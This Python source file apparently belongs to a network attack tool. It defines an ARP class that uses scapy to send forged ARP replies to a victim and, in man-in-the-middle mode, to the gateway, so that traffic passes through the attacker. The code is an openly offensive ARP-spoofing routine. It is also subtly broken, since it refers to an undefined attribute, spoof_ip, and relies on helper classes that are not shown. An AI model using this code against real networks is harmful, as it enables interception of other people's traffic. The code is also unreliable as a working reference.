#!/usr/bin/env python
from classes.User import User
from classes.ARPPacket import ARPPacket
from scapy.all import *

class ARP:
    def __init__(self, attacker, victim, gateway):
        self.attacker = attacker
        self.victim = victim
        self.gateway = gateway


    def spoof(self, mitm = False):
        victim_packet = ARPPacket(
            self.attacker,
            self.victim,
            self.spoof_ip
        )
        victim_packet.send()
        
        if (mitm):
            gateway_packet = ARPPacket(
                self.attacker,
                self.gateway,
                self.victim.IP
            )
            gateway_packet.send()
